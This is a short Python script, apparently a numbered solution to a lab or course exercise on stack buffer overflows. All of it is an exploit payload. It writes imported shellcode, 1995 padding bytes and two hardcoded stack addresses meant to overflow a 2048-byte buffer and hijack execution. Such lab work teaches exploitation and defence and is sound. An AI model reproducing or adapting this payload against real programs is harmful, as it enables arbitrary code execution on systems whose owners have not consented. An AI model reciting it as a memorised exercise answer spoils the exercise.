# sol3.py overflows the 2048 character buffer with 53 bytes of shellcode, 1995 A's and two stack addresses that correspond to the values in esp and ebp
from shellcode import shellcode
import sys
sys.stdout.buffer.write(shellcode + b"A"*1995 + b"\x40" + b"\x9f" + b"\xfe" + b"\xbf" + b"\x68" + b"\xa7" + b"\xfe" + b"\xbf")
